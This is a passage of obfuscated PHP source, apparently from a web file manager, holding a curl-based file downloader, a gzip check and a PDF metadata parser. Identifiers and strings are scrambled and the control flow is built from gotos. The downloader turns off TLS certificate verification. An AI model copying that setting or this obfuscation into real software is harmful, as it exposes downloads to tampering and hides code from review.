(!$eµ•åÔíäé) { return array($a¾ôÜÔ˜¢¶[1039] => !1, $a¾ôÜÔ˜¢¶[1041] => $a¾ôÜÔ˜¢¶[1531]); } } goto Eöš—¾‹; C×§Üæ “: } else { return array($a¾ôÜÔ˜¢¶[1039] => !1, $a¾ôÜÔ˜¢¶[1041] => $a¾ôÜÔ˜¢¶[1532]); } } static function fileDownloadCurl($E›ƒ´””Úé, $D§Æ¶šªª•, $A³í›†Í‡ = false, $a…öŠ±îÄ = 0, $DÉé‹Íé· = 0) { goto bÔÖóõì‰; Câ«´Ñ•„: curl_setopt($ašÛª°êØ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($ašÛª°êØ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ašÛª°êØ, CURLOPT_SSL_VERIFYHOST, 0); goto fİƒ—ö…±î; fİƒ—ö…±î: curl_setopt($ašÛª°êØ, CURLOPT_NOPROGRESS, !1); curl_setopt($ašÛª°êØ, CURLOPT_PROGRESSFUNCTION, $eÓ‰Éİ‚[1534]); curl_progress_start($ašÛª°êØ); goto DŸ¶ÈîğØ; bó‰×µŠœ: if ($DØ‚ğ‹³Îğ < $DÉé‹Íé· && $DÉé‹Íé· != 0) { return array($eÓ‰Éİ‚[1039] => !1, $eÓ‰Éİ‚[1041] => $eÓ‰Éİ‚[1523]); } if ($f…Ğ¥µÎå³ && filesize($F”¹ÄÒÄĞ) != 0) { self::checkGzip($F”¹ÄÒÄĞ); if (!@rename($F”¹ÄÒÄĞ, $D§Æ¶šªª•)) { @unlink($D§Æ¶šªª•); $f…Ğ¥µÎå³ = @rename($F”¹ÄÒÄĞ, $D§Æ¶šªª•); if (!$f…Ğ¥µÎå³) { return array($eÓ‰Éİ‚[1039] => !1, $eÓ‰Éİ‚[1041] => $eÓ‰Éİ‚[1535]); } } return array($eÓ‰Éİ‚[1039] => !0, $eÓ‰Éİ‚[1041] => $eÓ‰Éİ‚[705]); } return array($eÓ‰Éİ‚[1039] => !1, $eÓ‰Éİ‚[1041] => $eÓ‰Éİ‚[1536]); goto aÓÉ‡Ë‰â±; D³ßéš: if ($A³í›†Í‡) { curl_setopt($ašÛª°êØ, CURLOPT_RANGE, $a…öŠ±îÄ . $eÓ‰Éİ‚[724]); } curl_setopt($ašÛª°êØ, CURLOPT_FILE, $aÒ”Œ¸Ú¾); curl_setopt($ašÛª°êØ, CURLOPT_REFERER, get_url_link($E›ƒ´””Úé)); goto Câ«´Ñ•„; bÔÖóõì‰: $eÓ‰Éİ‚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F”¹ÄÒÄĞ = $D§Æ¶šªª• . $eÓ‰Éİ‚[1522]; set_timeout(); goto dÂÙÂÖÉÂÌ; F¹îÒíãİ: curl_close($ašÛª°êØ); fclose($aÒ”Œ¸Ú¾); $DØ‚ğ‹³Îğ = filesize(iconv_system($F”¹ÄÒÄĞ)); goto bó‰×µŠœ; DŸ¶ÈîğØ: curl_setopt($ašÛª°êØ, CURLOPT_USERAGENT, $eÓ‰Éİ‚[1526]); $f…Ğ¥µÎå³ = curl_exec($ašÛª°êØ); curl_progress_end($ašÛª°êØ); goto F¹îÒíãİ; dÂÙÂÖÉÂÌ: $aÒ”Œ¸Ú¾ = @fopen($F”¹ÄÒÄĞ, $eÓ‰Éİ‚[987]); if (!$aÒ”Œ¸Ú¾) { return array($eÓ‰Éİ‚[1039] => !1, $eÓ‰Éİ‚[1041] => $eÓ‰Éİ‚[1533]); } $ašÛª°êØ = curl_init($E›ƒ´””Úé); goto D³ßéš; aÓÉ‡Ë‰â±: } static function checkGzip($Dƒ‚£ŠÔ§±) { goto DšÄ­°ââ; C„Ó…Ç°£»: ob_start(); readgzfile($Dƒ‚£ŠÔ§±); $FØ¬Ã…ì¨Œ = ob_get_clean(); goto CÖÆ­òØ„¦; DšÄ­°ââ: $Fï­ŒÖ³ÌÉ = $_SERVER[çŞáÓæÚô‚Ô‡][1537]; $a£ÀÒ›ªó = file_sub_str($Dƒ‚£ŠÔ§±, 0, 2); if ($Fï­ŒÖ³ÌÉ != $a£ÀÒ›ªó) { return; } goto C„Ó…Ç°£»; CÖÆ­òØ„¦: file_put_contents($Dƒ‚£ŠÔ§±, $FØ¬Ã…ì¨Œ); goto C‰„Şš™ôÜ; C‰„Şš™ôÜ: } } class FileParsePdf { public static function parse($C°ßŒæ°ÌÛ) { goto eÈ¦…²âˆ«; eÈ¦…²âˆ«: $d‘ÊÇÃŒ¨ˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f©ç¦Ñ‰Ş› = 32 * 1024; $fİŒÌª›° = array($d‘ÊÇÃŒ¨ˆ[785] => fopen($C°ßŒæ°ÌÛ, $d‘ÊÇÃŒ¨ˆ[1177]), $d‘ÊÇÃŒ¨ˆ[85] => $C°ßŒæ°ÌÛ, $d‘ÊÇÃŒ¨ˆ[87] => filesize($C°ßŒæ°ÌÛ), $d‘ÊÇÃŒ¨ˆ[1538] => $f©ç¦Ñ‰Ş›); goto bù¢„óÑÎÛ; aØ„„³‘­¹: $c¹ÆŞ¹¨• = $d‘ÊÇÃŒ¨ˆ[1543]; preg_match($c¹ÆŞ¹¨•, $fİŒÌª›°[$d‘ÊÇÃŒ¨ˆ[1539]], $f¾¶ÙĞÙ•“); if (!$bˆÃ¼…Ìå[$d‘ÊÇÃŒ¨ˆ[1542]] && count($f¾¶ÙĞÙ•“) == 5) { $bˆÃ¼…Ìå[$d‘ÊÇÃŒ¨ˆ[1542]] = $f¾¶ÙĞÙ•“[3]; $bˆÃ¼…Ìå[$d‘ÊÇÃŒ¨ˆ[1544]] = $f¾¶ÙĞÙ•“[4]; } goto A³„ñ°Äöé; dß÷Š§ŒÜó: preg_match_all($c¹ÆŞ¹¨•, $fİŒÌª›°[$d‘ÊÇÃŒ¨ˆ[1539]], $f¾¶ÙĞÙ•“); if ($f¾¶ÙĞÙ•“[1] && $bˆÃ¼…Ìå[$d‘ÊÇÃŒ¨ˆ[1546]] < $f¾¶ÙĞÙ•“[1][0]) { $bˆÃ¼…Ìå[$d‘ÊÇÃŒ¨ˆ[1546]] = $f¾¶ÙĞÙ•“[1][0]; } preg_match_all($c¹ÆŞ¹¨•, $fİŒÌª›°[$d‘ÊÇÃŒ¨ˆ[1540]], $f¾¶ÙĞÙ•“); goto AÛ¿—„¥Šà; BÔ‘®×´’ã: if ($f¾¶ÙĞÙ•“) { $bˆÃ¼…Ìå[$d‘ÊÇÃŒ¨ˆ[1348]] = $f¾¶ÙĞÙ•“[1]; } $bˆÃ¼…Ìå[$d‘ÊÇÃŒ¨ˆ[1546]] = 0; $c¹ÆŞ¹¨• = $d‘ÊÇÃŒ¨ˆ[1547]; goto dß÷Š§ŒÜó; A³„ñ°Äöé: preg_match($c¹ÆŞ¹¨•, $fİŒÌª›°[$d‘ÊÇÃŒ¨ˆ[1540]], $f¾¶ÙĞÙ•“); if (!$bˆÃ¼…Ìå[$d‘ÊÇÃŒ¨ˆ[1542]] && count($f¾¶ÙĞÙ•“) == 5) { $bˆÃ¼…Ìå[$d‘ÊÇÃŒ¨ˆ[1542]] = $f¾¶ÙĞÙ•“[3]; $bˆÃ¼…Ìå[$d‘ÊÇÃŒ¨ˆ[1544]] = $f¾¶ÙĞÙ•“[4]; } preg_match($d‘ÊÇÃŒ¨ˆ[1545], $fİŒÌª›°[$d‘ÊÇÃŒ¨ˆ[1539]], $f¾¶ÙĞÙ•“); goto BÔ‘®×´’ã; AÛ¿—„¥Šà: if ($f¾¶ÙĞÙ•“[1] && $bˆÃ¼…Ìå[$d‘ÊÇÃŒ¨ˆ[1546]] < $f¾¶ÙĞÙ•“[1][0]) { $bˆÃ¼…Ìå[$d‘ÊÇÃŒ¨ˆ[1546]] = $f¾¶ÙĞÙ•“[1][0]; } $bˆÃ¼…Ìå = self::parseInfoItem($bˆÃ¼…Ìå); return $bˆÃ¼…Ìå; goto eêÇáÍ³‰§; Eßâ§İ—Œ: if ($b¢–·ÔÙÉ¨) { $FÁé•É¦—¼ = $b¢–·ÔÙÉ¨[$d‘ÊÇÃŒ¨ˆ[1541]][$d‘ÊÇÃŒ¨ˆ[1199]]; $bˆÃ¼…Ìå = self::getObjectValue($fİŒÌª›°, $b¢–·ÔÙÉ¨, $FÁé•É¦—¼); } $bˆÃ¼…Ìå = is_array($bˆÃ¼…Ìå) ? $bˆÃ¼…Ìå : array(); $bˆÃ¼…Ìå[$d‘ÊÇÃŒ¨ˆ[1542]] = 0; goto aØ„„³‘­¹; bù¢„óÑÎÛ: $fİŒÌª›°[$d‘ÊÇÃŒ¨ˆ[1539]] = StreamWrapperIO::read($C°ßŒæ°ÌÛ, 0, $f©ç¦Ñ‰Ş›); $fİŒÌª›°[$d‘ÊÇÃŒ¨ˆ[1540]] = StreamWrapperIO::read($C°ßŒæ°ÌÛ, $fİŒÌª›°[$d‘ÊÇÃŒ¨ˆ[87]] - $f©ç¦Ñ‰Ş›, $f©ç¦Ñ‰Ş›); $b¢–·ÔÙÉ¨ = self::decodeXref($fİŒÌª›°); goto Eßâ§İ—Œ; eêÇáÍ³‰§: } private static function parseInfoItem($Eœ‰‰…ŸËí) { $FÑâÄµ¥ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$Eœ‰‰…ŸËí) { return !1; } $CÍÁáß› = array($FÑâÄµ¥[1349] => array($FÑâÄµ¥[1548], $FÑâÄµ¥[43]), $FÑâÄµ¥[1549] => array($FÑâÄµ¥[1550], $FÑâÄµ¥[43]), $FÑâÄµ¥[197] => array($FÑâÄµ¥[1551], $FÑâÄµ¥[220]), $FÑâÄµ¥[117] => array($FÑâÄµ¥[1552], $FÑâÄµ¥[220]), $FÑâÄµ¥[1546] => array($FÑâÄµ¥[1546], $FÑâÄµ¥[285]), $FÑâÄµ¥[1542] => array($FÑâÄµ¥[1542], $FÑâÄµ¥[285]), $FÑâÄµ¥[1544] => array($FÑâÄµ¥[1544], $FÑâÄµ¥[285]), $FÑâÄµ¥[1553] => array($FÑâÄµ¥[1554], $FÑâÄµ¥[43]), $FÑâÄµ¥[1555] => array($FÑâÄµ¥[1556], $FÑâÄµ¥[43]), $FÑâÄµ¥[1557] => array($FÑâÄµ¥[1348], $FÑâÄµ¥[43])); $A¦±ÒÎ¬…ã = array(); foreach ($CÍÁáß› as $e÷»°‘‰ÔÊ => $c¢ğÔ›œ¯•) { if (!isset($Eœ‰‰…ŸËí[$c¢ğÔ›œ¯•[0]])) { continue; } $cƒèÅ› = $Eœ‰‰…ŸËí[$c¢ğÔ›œ¯•[0]]; if (!$cƒèÅ› || is_array($cƒèÅ›)) { continue; } switch ($c¢ğÔ›œ¯•[1]) { case $FÑâÄµ¥[285]: $cƒèÅ› = intval($cƒèÅ›); break; case $FÑâÄµ¥[220]: if (substr($cƒèÅ›, 0, 2) == $FÑâÄµ¥[1558]) { $cƒèÅ› = substr($cƒèÅ›, 2, 14); } if (strtotime($cƒèÅ›)) { $cƒèÅ› = date($FÑâÄµ¥[1559], strtotime($cƒèÅ›)); } break; } $A¦±ÒÎ¬…ã[$e÷»°‘‰ÔÊ] = $cƒèÅ›; } return $A¦±ÒÎ¬…ã; } private static function decodeXref(&$fÂè½Î°‘¸) { goto d¤ğ‚°¿‹²; bù ä½Ù: if (preg_match($DÌÃ„ƒ ±[1567], $d‚¨É¿Üêä, $B¯©Ô‚ØÂİ) > 0) { $b’˜Å¤¼ÙÌ[$DÌÃ„ƒ ±[1541]][$DÌÃ„ƒ ±[87]] = intval($B¯©Ô‚ØÂİ[1]); } if (preg_match($DÌÃ„ƒ ±[1568], $d‚¨É¿Üêä, $B¯©Ô‚ØÂİ) > 0) { $b’˜Å¤¼ÙÌ[$DÌÃ„ƒ ±[1541]][$DÌÃ„ƒ ±[1569]] = intval($B¯©Ô‚ØÂİ[1]) . $DÌÃ„ƒ ±[80] . intval($B¯©Ô‚ØÂİ[2]); } if (preg_match($DÌÃ„ƒ ±[1570], $d‚¨É¿Üêä, $B¯©Ô‚ØÂİ) > 0) { $b’˜Å¤¼ÙÌ[$DÌÃ„ƒ ±[1541]][$DÌÃ„ƒ ±[1571]] = intval($B¯©Ô‚ØÂİ[1]) . $DÌÃ„ƒ ±[80] . intval($B¯©Ô‚ØÂİ[2]); } goto fàÕ´¼„×Î; bàÆ¬­ìÜ‚: foreach ($B¯©Ô‚ØÂİ[3] as $Cìïã“½ƒŠ => $c†À˜ôå“ø) { if ($B¯©Ô‚ØÂİ[3][$Cìïã“½ƒŠ] == $DÌÃ„ƒ ±[1563]) { $f•§ŠÈÊ¦š = $E´ÓÔ§Š‚Ü . $DÌÃ„ƒ ±[80] . intval($B¯©Ô‚ØÂİ[2][$Cìïã“½ƒŠ]); $b’˜Å¤¼ÙÌ[$DÌÃ„ƒ ±[1560]][$f•§ŠÈÊ¦š] = intval($B¯©Ô‚ØÂİ[1][$Cìïã“½ƒŠ]); ++$E´ÓÔ§Š‚Ü; } else { if ($B¯©Ô‚ØÂİ[3][$Cìïã“½ƒŠ] == $DÌÃ„ƒ ±[1564]) { ++$E´ÓÔ§Š‚Ü; } else { } } } if (preg_match_all($DÌÃ„ƒ ±[1565], $Fé›ÎäÁí, $B¯©Ô‚ØÂİ)) { $bÉŒ—Ñ‹ğò = $fÂè½Î°‘¸[$DÌÃ„ƒ ±[87]] - $fÂè½Î°‘¸[$DÌÃ„ƒ ±[1538]]; foreach ($B¯©Ô‚ØÂİ[0] as $Cìïã“½ƒŠ => $fé±©ì¡ª¿) { $CÚ¹á­ëÚö = $B¯©Ô‚ØÂİ[1][$Cìïã“½ƒŠ] . $DÌÃ„ƒ ±[80] . $B¯©Ô‚ØÂİ[2][$Cìïã“½ƒŠ]; $b’˜Å¤¼ÙÌ[$DÌÃ„ƒ ±[1560]][$CÚ¹á­ëÚö] = strpos($Fé›ÎäÁí, $fé±©ì¡ª¿) + $bÉŒ—Ñ‹ğò + 1; } } if (preg_match_all($DÌÃ„ƒ ±[1566], $Fé›ÎäÁí, $B¯©Ô‚ØÂİ)) { $d‚¨É¿Üêä = count($B¯©Ô‚ØÂİ[1]) == 1 ? $B¯©Ô‚ØÂİ[1][0] : $B¯©Ô‚ØÂİ[1][1]; } else { $d‚¨É¿Üêä = substr($Fé›ÎäÁí, -1024 * 5); } goto bù ä½Ù; fàÕ´¼„×Î: if (preg_match($DÌÃ„ƒ ±[1572], $d‚¨É¿Üêä, $B¯©Ô‚ØÂİ) > 0) { $b’˜Å¤¼ÙÌ[$DÌÃ„ƒ ±[1541]][$DÌÃ„ƒ ±[1199]] = intval($B¯©Ô‚ØÂİ[1]) . $DÌÃ„ƒ ±[80] . intval($B¯©Ô‚ØÂİ[2]); } if (preg_match($DÌÃ„ƒ ±[1573], $d‚¨É¿Üêä, $B¯©Ô‚ØÂİ) > 0) { $b’˜Å¤¼ÙÌ[$DÌÃ„ƒ ±[1541]][$DÌÃ„ƒ ±[376]] = array(); $b’˜Å¤¼ÙÌ[$DÌÃ„ƒ ±[1541]][$DÌÃ„ƒ ±[376]][0] = $B¯©Ô‚ØÂİ[1]; $b’˜Å¤¼ÙÌ[$DÌÃ„ƒ ±[1541]][$DÌÃ„ƒ ±[376]][1] = $B¯©Ô‚ØÂİ[2]; } if (!$b’˜Å¤¼ÙÌ[$DÌÃ„ƒ ±[1541]][$DÌÃ„ƒ ±[1199]]) { return !1; } goto CÃÏÖÚ©»¼; aÍ¼Ù†Œæõ: if ($fÂè½Î°‘¸[$DÌÃ„ƒ ±[87]] - $a¿†ÂÛ“Ä > $fÂè½Î°‘¸[$DÌÃ„ƒ ±[1538]]) { $A¡ÀÛ¹¸… = 4 * $fÂè½Î°‘¸[$DÌÃ„ƒ ±[1538]]; $fÂè½Î°‘¸[$DÌÃ„ƒ ±[1538]] = $A¡ÀÛ¹¸…; $fÂè½Î°‘¸[$DÌÃ„ƒ ±[1539]] = StreamWrapperIO::read($fÂè½Î°‘¸[$DÌÃ„ƒ ±[85]], 0, $A¡ÀÛ¹¸…); $fÂè½Î°‘¸[$DÌÃ„ƒ ±[1540]] = StreamWrapperIO::read($fÂè½Î°‘¸[$DÌÃ„ƒ ±[85]], $fÂè½Î°‘¸[$DÌÃ„ƒ ±[87]] - $A¡ÀÛ¹¸…, $A¡ÀÛ¹¸…); $Fé›ÎäÁí = $fÂè½Î°‘¸[$DÌÃ„ƒ ±[1540]]; } $E´ÓÔ§Š‚Ü = 0; preg_match_all($DÌÃ„ƒ ±[1562], $Fé›ÎäÁí, $B¯©Ô‚ØÂİ); goto bàÆ¬­ìÜ‚; CÃÏÖÚ©»¼: if (preg_match($DÌÃ„ƒ ±[1574], $d‚¨É¿Üêä, $B¯©Ô‚ØÂİ) > 0) { } return $b’˜Å¤¼ÙÌ; goto DŸˆèî¦ó÷; BÅƒ§ÜÙ©õ: $f˜·‚¯İİë = $DÌÃ„ƒ ±[1561]; if (!preg_match_all($f˜·‚¯İİë, $Fé›ÎäÁí, $B¯©Ô‚ØÂİ, PREG_SET_ORDER, 0)) { return !1; } $a¿†ÂÛ“Ä = intval($B¯©Ô‚ØÂİ[0][1]); goto aÍ¼Ù†Œæõ; d¤ğ‚°¿‹²: $DÌÃ„ƒ ± =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Fé›ÎäÁí = $fÂè½Î°‘¸[$DÌÃ„ƒ ±[1540]]; $b’˜Å¤¼ÙÌ = array($DÌÃ„ƒ ±[1541] => array(), $DÌÃ„ƒ ±[1560] => array()); goto BÅƒ§ÜÙ©õ; DŸˆèî¦ó÷: } private static function getObjectValue($a¡óˆˆ¼ª‹, $F—’‰Áñ³¹, $f°³ê¼ó»ä) { goto A½êìÕ°¿; A½êìÕ°¿: $d¤ÉæÃõäÒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A½Úß´‹ˆ = self::getObject($a¡óˆˆ¼ª‹, $F—’‰Áñ³¹[$d¤ÉæÃõäÒ[1560]][$f°³ê¼ó»ä]); if (is_string($A½Úß´‹ˆ[1])) { return $A½Úß´‹ˆ[1]; } goto cÀ öÇïÖí; A‹ø‹‹Œé: return $eÄêÅÓôÚ; goto dµÒÎÉš¥¢; cÀ öÇïÖí: if (!is_array($A½Úß´‹ˆ[1])) { return array(); } $eÄêÅÓôÚ = array(); for ($Aó‘Ú³ù© = 0; $Aó‘Ú³ù© < count($A½Úß´‹ˆ[1]); $Aó‘Ú³ù© += 2) { $Fš¬í±¶ó = $A½Úß´‹ˆ[1][$Aó‘Ú³ù©]; $Cè¸¬÷Œ¹² = $A½Úß´‹ˆ[1][$Aó‘Ú³ù© + 1]; if (count($Fš¬í±¶ó) == 3 && $Fš¬í±¶ó[0] == $d¤ÉæÃõäÒ[18]) { $Cá½»Ù¸Â¼ = !1; if ($Cè¸¬÷Œ¹²[0] == $d¤ÉæÃõäÒ[1575]) { $Cè¸¬÷Œ¹² = self::getObject($a¡óˆˆ¼ª‹, $F—’‰Áñ³¹[$d¤ÉæÃõäÒ[1560]][$Cè¸¬÷Œ¹²[1]]); } $Cá½»Ù¸Â¼ = $Cè¸¬÷Œ¹²[1]; if ($Cá½»Ù¸Â¼ === !1) { continue; } if (is_string($Cá½»Ù¸Â¼)) { $Cá½»Ù¸Â¼ = self::decodeStr($Cá½»Ù¸Â¼); } $eÄêÅÓôÚ[$Fš¬í±¶ó[1]] = $Cá½»Ù¸Â¼; } } goto A‹ø‹‹Œé; dµÒÎÉš¥¢: } private static function getObject($C—Ä¿É†íœ, $bˆ®“£ùóš) { $c½µˆ±Œˆğ = self::getObjectItem($C—Ä¿É†íœ, $bˆ®“£ùóš); $c½µˆ±Œˆğ = self::getObjectItem($C—Ä¿É†íœ, $c½µˆ±Œˆğ[2]); return $c½µˆ±Œˆğ; } private static function getObjectItem($D¿ÃÓ¥é‡ƒ, $AÃ…±£·õ¬) { goto AÎ­Û·ƒâ; AÎ­Û·ƒâ: $F—”™‚¯ã¹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bŠ‚¤ £”Ö = $D¿ÃÓ¥é‡ƒ[$F—”™‚¯ã¹[1538]]; $F‚ÉĞŞ§á = $D¿ÃÓ¥é‡ƒ[$F—”™‚¯ã¹[87]] - $bŠ‚¤ £”Ö; goto ešó†ÉÉàã; FŒ˜—êğ: $A¿²šœ ¿ë = self::getRawObject($Cå¤ à£ƒ¯, $FÒ²•Ú‡Œ); if ($AÃ…±£·õ¬ >= $F‚ÉĞŞ§á) { $A¿²šœ ¿ë[2] = $A¿²šœ ¿ë[2] + $F‚ÉĞŞ§á; } else { if ($AÃ…±£·õ¬ > $bŠ‚¤ £”Ö && $AÃ…±£·õ¬ <= $F‚ÉĞŞ§á) { $A¿²šœ ¿ë[2] = $A¿²šœ ¿ë[2] + $AÃ…±£·õ¬; } } return $A¿²šœ ¿ë; goto D‡»‘‰ô´; ešó†ÉÉàã: $FÒ²•Ú‡Œ = $AÃ…±£·õ¬ >= $F‚ÉĞŞ§á ? $AÃ…±£·õ¬ - $F‚ÉĞŞ§á : $AÃ…±£·õ¬; $Cå¤ à£ƒ¯ = $AÃ…±£·õ¬ >= $F‚ÉĞŞ§á ? $D¿ÃÓ¥é‡ƒ[$F—”™‚¯ã¹[1540]] : $D¿ÃÓ¥é‡ƒ[$F—”™‚¯ã¹[1539]]; if ($AÃ…±£·õ¬ > $bŠ‚¤ £”Ö && $AÃ…±£·õ¬ <= $F‚ÉĞŞ§á) { $FÒ²•Ú‡Œ = 0; $Cå¤ à£ƒ¯ = StreamWrapperIO::read($D¿ÃÓ¥é‡ƒ[$F—”™‚¯ã¹[85]], $AÃ…±£·õ¬, $bŠ‚¤ £”Ö); } goto FŒ˜—êğ; D‡»‘‰ô´: } private static function decodeStr($eÕÄµº´…) { goto d­Ú³”ì‡§; CÛŒèäãİÀ: $eÕÄµº´… = $FéÙÅ‰ôà[43]; foreach ($fÆ¨¼•‹è as $Díğã¼— ˆ) { if (preg_match($FéÙÅ‰ôà[1590], $Díğã¼— ˆ) && !1 === stripos($Díğã¼— ˆ, $FéÙÅ‰ôà[1591])) { $Díğã¼— ˆ = preg_replace($FéÙÅ‰ôà[1592], $FéÙÅ‰ôà[43], $Díğã¼— ˆ); $Díğã¼— ˆ = trim($Díğã¼— ˆ, $FéÙÅ‰ôà[932]); $Díğã¼— ˆ = pack($FéÙÅ‰ôà[1593], $Díğã¼— ˆ); $eÕÄµº´… .= $Díğã¼— ˆ; } else { $eÕÄµº´… .= $Díğã¼— ˆ; } } if (preg_match($FéÙÅ‰ôà[1594], $eÕÄµº´…)) { $báó²éñµ™ = substr($eÕÄµº´…, 2); $eÕÄµº´… = $FéÙÅ‰ôà[43]; $c£…àÉäË = strlen($báó²éñµ™); for ($Dœ¤ÛªÎ¬¡ = 0; $Dœ¤ÛªÎ¬¡ < $c£…àÉäË; $Dœ¤ÛªÎ¬¡ += 2) { $cñß£òğÆ© = hexdec(bin2hex(substr($báó²éñµ™, $Dœ¤ÛªÎ¬¡, 2))); $eÕÄµº´… .= mb_convert_encoding($FéÙÅ‰ôà[1595] . intval($cñß£òğÆ©) . $FéÙÅ‰ôà[77], $FéÙÅ‰ôà[1596], $FéÙÅ‰ôà[1597]); } } goto D‚Ö¤–«‡“; bÀšŠØ×é•: $eÕÄµº´… = $FéÙÅ‰ôà[43]; foreach ($fÆ¨¼•‹è as $Díğã¼— ˆ) { if (preg_match($FéÙÅ‰ôà[1585], $Díğã¼— ˆ)) { $eÕÄµº´… .= \chr(octdec(trim($Díğã¼— ˆ, $FéÙÅ‰ôà[103]))); } else { $eÕÄµº´… .= $Díğã¼— ˆ; } } $fÆ¨¼•‹è = preg_split($FéÙÅ‰ôà[1586], $eÕÄµº´…, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Fª„¬ŒÁ­¥; d­Ú³”ì‡§: $FéÙÅ‰ôà =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eÕÄµº´… = str_replace(array($FéÙÅ‰ôà[1576], $FéÙÅ‰ôà[1577], $FéÙÅ‰ôà[1578], $FéÙÅ‰ôà[1579], $FéÙÅ‰ôà[1580], $FéÙÅ‰ôà[1581], $FéÙÅ‰ôà[1582], $FéÙÅ‰ôà[1583]), array($FéÙÅ‰ôà[103], $FéÙÅ‰ôà[60], $FéÙÅ‰ôà[18], $FéÙÅ‰ôà[257], $FéÙÅ‰ôà[823], $FéÙÅ‰ôà[11], $FéÙÅ‰ôà[999], $FéÙÅ‰ôà[339]), $eÕÄµº´…); $fÆ¨¼•‹è = preg_split($FéÙÅ‰ôà[1584], $eÕÄµº´…, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto bÀšŠØ×é•; D‚Ö¤–«‡“: return $eÕÄµº´…; goto c–ˆ´ ´¼–; Fª„¬ŒÁ­¥: $eÕÄµº´… = $FéÙÅ‰ôà[43]; foreach ($fÆ¨¼•‹è as $Díğã¼— ˆ) { if (preg_match($FéÙÅ‰ôà[1587], $Díğã¼— ˆ)) { $eÕÄµº´… .= \chr(hexdec(trim($Díğã¼— ˆ, $FéÙÅ‰ôà[1588]))); } else { $eÕÄµº´… .= $Díğã¼— ˆ; } } $fÆ¨¼•‹è = preg_split($FéÙÅ‰ôà[1589], $eÕÄµº´…, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto CÛŒèäãİÀ; c–ˆ´ ´¼–: } private static function getRawObject($BÇŒ¯©ô›, $C÷ß²ÛÜé = 0) { goto c‹Ş»àä¿Ü; Cˆ±­Å°˜’: return array($eëæ¦ŒÜ—ˆ, $B¿ñœŒ¦, $C÷ß²ÛÜé); goto dÕ—Á²ïÊÏ; Eªù³Ò˜¯ô: $C÷ß²ÛÜé += strspn($BÇŒ¯©ô›, $eæÇõšíÍ¹[1598], $C÷ß²ÛÜé); $E°œ±‡¡°„ = $BÇŒ¯©ô›[$C÷ß²ÛÜé]; switch ($E°œ±‡¡°„) { case $eæÇõšíÍ¹[1599]: $eÜÖÁÌÑö‡ = strcspn($BÇŒ¯©ô›, $eæÇõšíÍ¹[1600], $C÷ß²ÛÜé); if ($eÜÖÁÌÑö‡ > 0) { $C÷ß²ÛÜé += $eÜÖÁÌÑö‡; return self::getRawObject($BÇŒ¯©ô›, $C÷ß²ÛÜé); } break; case $eæÇõšíÍ¹[18]: $eëæ¦ŒÜ—ˆ = $E°œ±‡¡°„; ++$C÷ß²ÛÜé; $B¿©«»¿Æ = preg_match($eæÇõšíÍ¹[1601], substr($BÇŒ¯©ô›, $C÷ß²ÛÜé, 256), $d¼ñ×‡ìÊ™); if (1 == $B¿©«»¿Æ) { $B¿ñœŒ¦ = $d¼ñ×‡ìÊ™[1]; $C÷ß²ÛÜé += strlen($B¿ñœŒ¦); } break; case $eæÇõšíÍ¹[257]: case $eæÇõšíÍ¹[823]: $eëæ¦ŒÜ—ˆ = $E°œ±‡¡°„; ++$C÷ß²ÛÜé; $AÑˆãØ™’° = $C÷ß²ÛÜé; if ($eæÇõšíÍ¹[257] == $E°œ±‡¡°„) { $BôÏ›êµ¯§ = 1; while ($BôÏ›êµ¯§ > 0) { if (!isset($BÇŒ¯©ô›[$AÑˆãØ™’°])) { break; } $Dñ™³’ù˜· = $BÇŒ¯©ô›[$AÑˆãØ™’°]; switch ($Dñ™³’ù˜·) { case $eæÇõšíÍ¹[103]: ++$AÑˆãØ™’°; break; case $eæÇõšíÍ¹[257]: ++$BôÏ›êµ¯§; break; case $eæÇõšíÍ¹[823]: --$BôÏ›êµ¯§; break; } ++$AÑˆãØ™’°; } $B¿ñœŒ¦ = substr($BÇŒ¯©ô›, $C÷ß²ÛÜé, $AÑˆãØ™’° - $C÷ß²ÛÜé - 1); $C÷ß²ÛÜé = $AÑˆãØ™’°; } break; case $eæÇõšíÍ¹[167]: case $eæÇõšíÍ¹[487]: $eëæ¦ŒÜ—ˆ = $E°œ±‡¡°„; ++$C÷ß²ÛÜé; if ($eæÇõšíÍ¹[167] == $E°œ±‡¡°„) { $B¿ñœŒ¦ = array(); do { $E‘¸ä¢âÌ = $C÷ß²ÛÜé; $cÍ°´£ÃÜ = self::getRawObject($BÇŒ¯©ô›, $C÷ß²ÛÜé); $C÷ß²ÛÜé = $cÍ°´£ÃÜ[2]; $B¿ñœŒ¦[] = $cÍ°´£ÃÜ; } while ($eæÇõšíÍ¹[487] != $cÍ°´£ÃÜ[0] && $C÷ß²ÛÜé != $E‘¸ä¢âÌ); array_pop($B¿ñœŒ¦); } break; case $eæÇõšíÍ¹[931]: case $eæÇõšíÍ¹[934]: if (isset($BÇŒ¯©ô›[$C÷ß²ÛÜé + 1]) && $BÇŒ¯©ô›[$C÷ß²ÛÜé + 1] == $E°œ±‡¡°„) { $eëæ¦ŒÜ—ˆ = $E°œ±‡¡°„ . $E°œ±‡¡°„; $C÷ß²ÛÜé += 2; if ($eæÇõšíÍ¹[931] == $E°œ±‡¡°„) { $B¿ñœŒ¦ = array(); do { $E‘¸ä¢âÌ = $C÷ß²ÛÜé; $cÍ°´£ÃÜ = self::getRawObject($BÇŒ¯©ô›, $C÷ß²ÛÜé); $C÷ß²ÛÜé = $cÍ°´£ÃÜ[2]; $B¿ñœŒ¦[] = $cÍ°´£ÃÜ; } while ($eæÇõšíÍ¹[1602] != $cÍ°´£ÃÜ[0] && $C÷ß²ÛÜé != $E‘¸ä¢âÌ); array_pop($B¿ñœŒ¦); } } else { $eëæ¦ŒÜ—ˆ = $E°œ±‡¡°„; ++$C÷ß²ÛÜé; $B¿©«»¿Æ = preg_match($eæÇõšíÍ¹[1603], substr($BÇŒ¯©ô›, $C÷ß²ÛÜé), $d¼ñ×‡ìÊ™); if 